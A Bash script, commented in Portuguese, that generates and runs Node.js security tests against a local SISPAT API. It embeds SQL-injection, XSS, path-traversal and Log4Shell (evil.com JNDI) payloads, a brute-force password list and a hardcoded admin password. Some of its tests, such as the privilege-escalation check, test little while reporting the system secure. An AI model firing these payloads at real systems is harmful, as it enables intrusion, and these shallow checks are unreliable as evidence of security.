#!/bin/bash

# SISPAT - Script de Testes de Segurança
# Este script executa testes de segurança, vulnerabilidades e penetração

set -e

echo "🚀 Executando Testes de Segurança..."

# Cores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Função para log
log() {
    echo -e "${GREEN}[$(date +'%Y-%m-%d %H:%M:%S')]${NC} $1"
}

warn() {
    echo -e "${YELLOW}[$(date +'%Y-%m-%d %H:%M:%S')] WARNING:${NC} $1"
}

error() {
    echo -e "${RED}[$(date +'%Y-%m-%d %H:%M:%S')] ERROR:${NC} $1"
}

# Configurações
BASE_URL=${1:-"http://localhost:3001"}
TEST_RESULTS_DIR="/var/log/sispat/security-tests"
DATE=$(date +%Y%m%d_%H%M%S)

# Criar diretório de resultados
mkdir -p $TEST_RESULTS_DIR

# 1. Testes de Autenticação e Autorização
log "Executando testes de autenticação e autorização..."

# Criar script de teste de autenticação
tee /tmp/auth_security.js > /dev/null << 'EOF'
const axios = require('axios');

async function testAuthSecurity() {
    const baseUrl = process.env.BASE_URL || 'http://localhost:3001';
    const results = {
        tests: [],
        passed: 0,
        failed: 0
    };

    // Teste 1: Rate limiting de login
    try {
        const promises = [];
        for (let i = 0; i < 50; i++) {
            promises.push(axios.post(`${baseUrl}/api/auth/login`, {
                email: 'test@test.com',
                password: 'wrongpassword'
            }).catch(error => error));
        }
        
        const responses = await Promise.all(promises);
        const rateLimited = responses.some(response => 
            response.response && response.response.status === 429
        );
        
        if (rateLimited) {
            results.tests.push({ name: 'Rate Limiting Login', status: 'PASS' });
            results.passed++;
        } else {
            results.tests.push({ name: 'Rate Limiting Login', status: 'FAIL', error: 'Rate limiting não funcionando' });
            results.failed++;
        }
    } catch (error) {
        results.tests.push({ name: 'Rate Limiting Login', status: 'FAIL', error: error.message });
        results.failed++;
    }

    // Teste 2: Acesso sem token
    try {
        await axios.get(`${baseUrl}/api/patrimonios`);
        results.tests.push({ name: 'Acesso sem Token', status: 'FAIL', error: 'Deveria ter falhado' });
        results.failed++;
    } catch (error) {
        if (error.response && error.response.status === 401) {
            results.tests.push({ name: 'Acesso sem Token', status: 'PASS' });
            results.passed++;
        } else {
            results.tests.push({ name: 'Acesso sem Token', status: 'FAIL', error: error.message });
            results.failed++;
        }
    }

    // Teste 3: Token inválido
    try {
        await axios.get(`${baseUrl}/api/patrimonios`, {
            headers: { Authorization: 'Bearer invalid-token' }
        });
        results.tests.push({ name: 'Token Inválido', status: 'FAIL', error: 'Deveria ter falhado' });
        results.failed++;
    } catch (error) {
        if (error.response && error.response.status === 401) {
            results.tests.push({ name: 'Token Inválido', status: 'PASS' });
            results.passed++;
        } else {
            results.tests.push({ name: 'Token Inválido', status: 'FAIL', error: error.message });
            results.failed++;
        }
    }

    // Teste 4: Autorização de superuser
    try {
        const loginResponse = await axios.post(`${baseUrl}/api/auth/login`, {
            email: 'admin@sispat.com',
            password: 'admin123'
        });
        
        const token = loginResponse.data.token;
        const response = await axios.get(`${baseUrl}/api/users`, {
            headers: { Authorization: `Bearer ${token}` }
        });
        
        if (response.status === 200) {
            results.tests.push({ name: 'Autorização Superuser', status: 'PASS' });
            results.passed++;
        } else {
            results.tests.push({ name: 'Autorização Superuser', status: 'FAIL', error: 'Falha na autorização' });
            results.failed++;
        }
    } catch (error) {
        results.tests.push({ name: 'Autorização Superuser', status: 'FAIL', error: error.message });
        results.failed++;
    }

    return results;
}

testAuthSecurity().then(results => {
    console.log(JSON.stringify(results, null, 2));
}).catch(error => {
    console.error('Erro nos testes de autenticação:', error);
    process.exit(1);
});
EOF

# Executar testes de autenticação
AUTH_SEC_RESULTS=$(node /tmp/auth_security.js)
echo "$AUTH_SEC_RESULTS" > $TEST_RESULTS_DIR/auth_security_$DATE.json

# Verificar resultados
AUTH_SEC_PASSED=$(echo "$AUTH_SEC_RESULTS" | jq -r '.passed')
AUTH_SEC_FAILED=$(echo "$AUTH_SEC_RESULTS" | jq -r '.failed')

if [ $AUTH_SEC_FAILED -eq 0 ]; then
    log "✅ Testes de autenticação: $AUTH_SEC_PASSED/$((AUTH_SEC_PASSED + AUTH_SEC_FAILED)) passaram"
else
    warn "⚠️ Testes de autenticação: $AUTH_SEC_FAILED falharam"
fi

# 2. Testes de Vulnerabilidades Web
log "Executando testes de vulnerabilidades web..."

# Criar script de teste de vulnerabilidades
tee /tmp/web_vulnerabilities.js > /dev/null << 'EOF'
const axios = require('axios');

async function testWebVulnerabilities() {
    const baseUrl = process.env.BASE_URL || 'http://localhost:3001';
    const results = {
        tests: [],
        passed: 0,
        failed: 0
    };

    // Teste 1: SQL Injection
    try {
        const sqlPayloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "'; DELETE FROM users; --",
            "' UNION SELECT * FROM users --",
            "admin'--",
            "admin'/*",
            "' OR 1=1#"
        ];
        
        let sqlInjectionBlocked = 0;
        for (const payload of sqlPayloads) {
            try {
                await axios.post(`${baseUrl}/api/auth/login`, {
                    email: payload,
                    password: 'test'
                });
            } catch (error) {
                if (error.response && error.response.status === 401) {
                    sqlInjectionBlocked++;
                }
            }
        }
        
        if (sqlInjectionBlocked === sqlPayloads.length) {
            results.tests.push({ name: 'SQL Injection', status: 'PASS' });
            results.passed++;
        } else {
            results.tests.push({ name: 'SQL Injection', status: 'FAIL', error: 'Possível vulnerabilidade SQL injection' });
            results.failed++;
        }
    } catch (error) {
        results.tests.push({ name: 'SQL Injection', status: 'FAIL', error: error.message });
        results.failed++;
    }

    // Teste 2: XSS
    try {
        const xssPayloads = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>",
            "<iframe src=javascript:alert('xss')></iframe>",
            "<body onload=alert('xss')>",
            "<input onfocus=alert('xss') autofocus>"
        ];
        
        let xssBlocked = 0;
        for (const payload of xssPayloads) {
            try {
                await axios.post(`${baseUrl}/api/auth/login`, {
                    email: payload,
                    password: 'test'
                });
            } catch (error) {
                if (error.response && error.response.status === 401) {
                    xssBlocked++;
                }
            }
        }
        
        if (xssBlocked === xssPayloads.length) {
            results.tests.push({ name: 'XSS', status: 'PASS' });
            results.passed++;
        } else {
            results.tests.push({ name: 'XSS', status: 'FAIL', error: 'Possível vulnerabilidade XSS' });
            results.failed++;
        }
    } catch (error) {
        results.tests.push({ name: 'XSS', status: 'FAIL', error: error.message });
        results.failed++;
    }

    // Teste 3: CSRF
    try {
        const response = await axios.get(`${baseUrl}/api/health`);
        const headers = response.headers;
        
        if (headers['x-frame-options'] || headers['content-security-policy']) {
            results.tests.push({ name: 'CSRF Protection', status: 'PASS' });
            results.passed++;
        } else {
            results.tests.push({ name: 'CSRF Protection', status: 'FAIL', error: 'Headers de proteção CSRF não encontrados' });
            results.failed++;
        }
    } catch (error) {
        results.tests.push({ name: 'CSRF Protection', status: 'FAIL', error: error.message });
        results.failed++;
    }

    // Teste 4: Headers de Segurança
    try {
        const response = await axios.get(`${baseUrl}/api/health`);
        const headers = response.headers;
        
        const securityHeaders = [
            'x-frame-options',
            'x-content-type-options',
            'x-xss-protection',
            'referrer-policy',
            'content-security-policy'
        ];
        
        let securityHeadersPresent = 0;
        for (const header of securityHeaders) {
            if (headers[header]) {
                securityHeadersPresent++;
            }
        }
        
        if (securityHeadersPresent >= 3) {
            results.tests.push({ name: 'Headers de Segurança', status: 'PASS', count: securityHeadersPresent });
            results.passed++;
        } else {
            results.tests.push({ name: 'Headers de Segurança', status: 'FAIL', error: `Apenas ${securityHeadersPresent} headers encontrados` });
            results.failed++;
        }
    } catch (error) {
        results.tests.push({ name: 'Headers de Segurança', status: 'FAIL', error: error.message });
        results.failed++;
    }

    // Teste 5: Directory Traversal
    try {
        const traversalPayloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ];
        
        let traversalBlocked = 0;
        for (const payload of traversalPayloads) {
            try {
                await axios.get(`${baseUrl}/api/patrimonios/${payload}`);
            } catch (error) {
                if (error.response && (error.response.status === 400 || error.response.status === 404)) {
                    traversalBlocked++;
                }
            }
        }
        
        if (traversalBlocked === traversalPayloads.length) {
            results.tests.push({ name: 'Directory Traversal', status: 'PASS' });
            results.passed++;
        } else {
            results.tests.push({ name: 'Directory Traversal', status: 'FAIL', error: 'Possível vulnerabilidade directory traversal' });
            results.failed++;
        }
    } catch (error) {
        results.tests.push({ name: 'Directory Traversal', status: 'FAIL', error: error.message });
        results.failed++;
    }

    return results;
}

testWebVulnerabilities().then(results => {
    console.log(JSON.stringify(results, null, 2));
}).catch(error => {
    console.error('Erro nos testes de vulnerabilidades web:', error);
    process.exit(1);
});
EOF

# Executar testes de vulnerabilidades
WEB_VULN_RESULTS=$(node /tmp/web_vulnerabilities.js)
echo "$WEB_VULN_RESULTS" > $TEST_RESULTS_DIR/web_vulnerabilities_$DATE.json

# Verificar resultados
WEB_VULN_PASSED=$(echo "$WEB_VULN_RESULTS" | jq -r '.passed')
WEB_VULN_FAILED=$(echo "$WEB_VULN_RESULTS" | jq -r '.failed')

if [ $WEB_VULN_FAILED -eq 0 ]; then
    log "✅ Testes de vulnerabilidades web: $WEB_VULN_PASSED/$((WEB_VULN_PASSED + WEB_VULN_FAILED)) passaram"
else
    warn "⚠️ Testes de vulnerabilidades web: $WEB_VULN_FAILED falharam"
fi

# 3. Testes de Penetração
log "Executando testes de penetração..."

# Criar script de teste de penetração
tee /tmp/penetration_tests.js > /dev/null << 'EOF'
const axios = require('axios');

async function testPenetration() {
    const baseUrl = process.env.BASE_URL || 'http://localhost:3001';
    const results = {
        tests: [],
        passed: 0,
        failed: 0
    };

    // Teste 1: Brute Force Attack
    try {
        const commonPasswords = [
            'admin', 'password', '123456', 'admin123', 'root',
            'test', 'guest', 'user', 'qwerty', 'letmein'
        ];
        
        let bruteForceBlocked = 0;
        for (const password of commonPasswords) {
            try {
                await axios.post(`${baseUrl}/api/auth/login`, {
                    email: 'admin@sispat.com',
                    password: password
                });
            } catch (error) {
                if (error.response && error.response.status === 401) {
                    bruteForceBlocked++;
                }
            }
        }
        
        if (bruteForceBlocked === commonPasswords.length) {
            results.tests.push({ name: 'Brute Force Attack', status: 'PASS' });
            results.passed++;
        } else {
            results.tests.push({ name: 'Brute Force Attack', status: 'FAIL', error: 'Possível vulnerabilidade brute force' });
            results.failed++;
        }
    } catch (error) {
        results.tests.push({ name: 'Brute Force Attack', status: 'FAIL', error: error.message });
        results.failed++;
    }

    // Teste 2: Privilege Escalation
    try {
        // Tentar acessar endpoints de admin com token de usuário comum
        const loginResponse = await axios.post(`${baseUrl}/api/auth/login`, {
            email: 'admin@sispat.com',
            password: 'admin123'
        });
        
        const token = loginResponse.data.token;
        
        // Tentar acessar endpoint de usuários (deveria funcionar para admin)
        const usersResponse = await axios.get(`${baseUrl}/api/users`, {
            headers: { Authorization: `Bearer ${token}` }
        });
        
        if (usersResponse.status === 200) {
            results.tests.push({ name: 'Privilege Escalation', status: 'PASS' });
            results.passed++;
        } else {
            results.tests.push({ name: 'Privilege Escalation', status: 'FAIL', error: 'Falha na verificação de privilégios' });
            results.failed++;
        }
    } catch (error) {
        results.tests.push({ name: 'Privilege Escalation', status: 'FAIL', error: error.message });
        results.failed++;
    }

    // Teste 3: Session Hijacking
    try {
        const loginResponse = await axios.post(`${baseUrl}/api/auth/login`, {
            email: 'admin@sispat.com',
            password: 'admin123'
        });
        
        const token = loginResponse.data.token;
        
        // Verificar se o token é válido
        const meResponse = await axios.get(`${baseUrl}/api/auth/me`, {
            headers: { Authorization: `Bearer ${token}` }
        });
        
        if (meResponse.status === 200) {
            results.tests.push({ name: 'Session Hijacking', status: 'PASS' });
            results.passed++;
        } else {
            results.tests.push({ name: 'Session Hijacking', status: 'FAIL', error: 'Falha na verificação de sessão' });
            results.failed++;
        }
    } catch (error) {
        results.tests.push({ name: 'Session Hijacking', status: 'FAIL', error: error.message });
        results.failed++;
    }

    // Teste 4: Information Disclosure
    try {
        const response = await axios.get(`${baseUrl}/api/health`);
        
        // Verificar se informações sensíveis não são expostas
        const responseText = JSON.stringify(response.data);
        const sensitiveInfo = ['password', 'secret', 'key', 'token', 'private'];
        
        let sensitiveInfoFound = 0;
        for (const info of sensitiveInfo) {
            if (responseText.toLowerCase().includes(info)) {
                sensitiveInfoFound++;
            }
        }
        
        if (sensitiveInfoFound === 0) {
            results.tests.push({ name: 'Information Disclosure', status: 'PASS' });
            results.passed++;
        } else {
            results.tests.push({ name: 'Information Disclosure', status: 'FAIL', error: 'Informações sensíveis podem estar expostas' });
            results.failed++;
        }
    } catch (error) {
        results.tests.push({ name: 'Information Disclosure', status: 'FAIL', error: error.message });
        results.failed++;
    }

    // Teste 5: Input Validation
    try {
        const maliciousInputs = [
            '<script>alert("xss")</script>',
            '"; DROP TABLE users; --',
            '../../../etc/passwd',
            '${jndi:ldap://evil.com/a}',
            '{{7*7}}',
            'javascript:alert(1)'
        ];
        
        let inputValidationPassed = 0;
        for (const input of maliciousInputs) {
            try {
                await axios.post(`${baseUrl}/api/auth/login`, {
                    email: input,
                    password: 'test'
                });
            } catch (error) {
                if (error.response && error.response.status === 401) {
                    inputValidationPassed++;
                }
            }
        }
        
        if (inputValidationPassed === maliciousInputs.length) {
            results.tests.push({ name: 'Input Validation', status: 'PASS' });
            results.passed++;
        } else {
            results.tests.push({ name: 'Input Validation', status: 'FAIL', error: 'Validação de entrada pode estar falhando' });
            results.failed++;
        }
    } catch (error) {
        results.tests.push({ name: 'Input Validation', status: 'FAIL', error: error.message });
        results.failed++;
    }

    return results;
}

testPenetration().then(results => {
    console.log(JSON.stringify(results, null, 2));
}).catch(error => {
    console.error('Erro nos testes de penetração:', error);
    process.exit(1);
});
EOF

# Executar testes de penetração
PENETRATION_RESULTS=$(node /tmp/penetration_tests.js)
echo "$PENETRATION_RESULTS" > $TEST_RESULTS_DIR/penetration_tests_$DATE.json

# Verificar resultados
PENETRATION_PASSED=$(echo "$PENETRATION_RESULTS" | jq -r '.passed')
PENETRATION_FAILED=$(echo "$PENETRATION_RESULTS" | jq -r '.failed')

if [ $PENETRATION_FAILED -eq 0 ]; then
    log "✅ Testes de penetração: $PENETRATION_PASSED/$((PENETRATION_PASSED + PENETRATION_FAILED)) passaram"
else
    warn "⚠️ Testes de penetração: $PENETRATION_FAILED falharam"
fi

# 4. Gerar relatório consolidado
log "Gerando relatório consolidado de segurança..."

# Calcular totais
TOTAL_SEC_PASSED=$((AUTH_SEC_PASSED + WEB_VULN_PASSED + PENETRATION_PASSED))
TOTAL_SEC_FAILED=$((AUTH_SEC_FAILED + WEB_VULN_FAILED + PENETRATION_FAILED))
TOTAL_SEC_TESTS=$((TOTAL_SEC_PASSED + TOTAL_SEC_FAILED))

# Gerar relatório
cat > $TEST_RESULTS_DIR/security_report_$DATE.json << EOF
{
  "timestamp": "$(date -Iseconds)",
  "type": "security_tests",
  "summary": {
    "total_tests": $TOTAL_SEC_TESTS,
    "passed": $TOTAL_SEC_PASSED,
    "failed": $TOTAL_SEC_FAILED,
    "success_rate": "$(echo "scale=2; $TOTAL_SEC_PASSED * 100 / $TOTAL_SEC_TESTS" | bc)%"
  },
  "categories": {
    "authentication": {
      "passed": $AUTH_SEC_PASSED,
      "failed": $AUTH_SEC_FAILED,
      "success_rate": "$(echo "scale=2; $AUTH_SEC_PASSED * 100 / ($AUTH_SEC_PASSED + $AUTH_SEC_FAILED)" | bc)%"
    },
    "web_vulnerabilities": {
      "passed": $WEB_VULN_PASSED,
      "failed": $WEB_VULN_FAILED,
      "success_rate": "$(echo "scale=2; $WEB_VULN_PASSED * 100 / ($WEB_VULN_PASSED + $WEB_VULN_FAILED)" | bc)%"
    },
    "penetration": {
      "passed": $PENETRATION_PASSED,
      "failed": $PENETRATION_FAILED,
      "success_rate": "$(echo "scale=2; $PENETRATION_PASSED * 100 / ($PENETRATION_PASSED + $PENETRATION_FAILED)" | bc)%"
    }
  },
  "files": {
    "authentication": "auth_security_$DATE.json",
    "web_vulnerabilities": "web_vulnerabilities_$DATE.json",
    "penetration": "penetration_tests_$DATE.json"
  }
}
EOF

# 5. Limpar arquivos temporários
log "Limpando arquivos temporários..."
rm -f /tmp/*_security.js /tmp/*_vulnerabilities.js /tmp/*_penetration.js

# 6. Exibir resumo final
log "🎉 Testes de segurança finalizados!"
log "📊 Resumo dos resultados:"
log "   • Total de testes: $TOTAL_SEC_TESTS"
log "   • Testes passaram: $TOTAL_SEC_PASSED"
log "   • Testes falharam: $TOTAL_SEC_FAILED"
log "   • Taxa de sucesso: $(echo "scale=2; $TOTAL_SEC_PASSED * 100 / $TOTAL_SEC_TESTS" | bc)%"
log ""
log "📋 Resultados por categoria:"
log "   • Autenticação: $AUTH_SEC_PASSED/$((AUTH_SEC_PASSED + AUTH_SEC_FAILED)) ($(echo "scale=2; $AUTH_SEC_PASSED * 100 / ($AUTH_SEC_PASSED + $AUTH_SEC_FAILED)" | bc)%)"
log "   • Vulnerabilidades Web: $WEB_VULN_PASSED/$((WEB_VULN_PASSED + WEB_VULN_FAILED)) ($(echo "scale=2; $WEB_VULN_PASSED * 100 / ($WEB_VULN_PASSED + $WEB_VULN_FAILED)" | bc)%)"
log "   • Penetração: $PENETRATION_PASSED/$((PENETRATION_PASSED + PENETRATION_FAILED)) ($(echo "scale=2; $PENETRATION_PASSED * 100 / ($PENETRATION_PASSED + $PENETRATION_FAILED)" | bc)%)"
log ""
log "📁 Relatórios salvos em: $TEST_RESULTS_DIR"
log "   • Relatório consolidado: security_report_$DATE.json"
log "   • Testes individuais: auth_security_$DATE.json, web_vulnerabilities_$DATE.json, etc."

if [ $TOTAL_SEC_FAILED -eq 0 ]; then
    log "✅ Todos os testes de segurança passaram! Sistema está seguro."
else
    warn "⚠️ $TOTAL_SEC_FAILED testes de segurança falharam. Revise os relatórios para correções."
fi
